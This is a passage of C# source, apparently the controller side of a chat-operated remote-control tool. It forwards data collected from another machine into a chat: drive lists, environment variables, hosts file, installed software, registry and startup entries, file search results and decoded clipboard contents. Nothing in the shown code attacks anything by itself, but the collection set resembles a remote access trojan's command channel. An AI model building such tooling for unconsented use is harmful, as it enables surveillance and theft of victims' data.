                        Say(chat, "<pre>" + Ui.Html(Ui.Short(sb.ToString(), 3500)) + "</pre>");
                        return;
                    }
                case "DRIVES_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(11), 3500)) + "</pre>"); return;
                case "ENV_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(8), 3500)) + "</pre>"); return;
                case "HOSTS_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(10), 3500)) + "</pre>"); return;
                case "SOFT_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(9), 3500)) + "</pre>"); return;
                case "SEARCH_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(11), 3500)) + "</pre>"); return;
                case "REG_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(8), 3500)) + "</pre>"); return;
                case "STARTUP_OUT|": Say(chat, "<pre>" + Ui.Html(Ui.Short(msg.Substring(12), 3500)) + "</pre>"); return;
                case "CLIP|":
                    {
                        string t;
                        try { t = Encoding.UTF8.GetString(Convert.FromBase64String(msg.Substring(5))); } catch { t = msg.Substring(5); }
                        Say(chat, "<pre>" + Ui.Html(Ui.Short(t, 3500)) + "</pre>");
                        return;
                    }
            }
        }
    }
}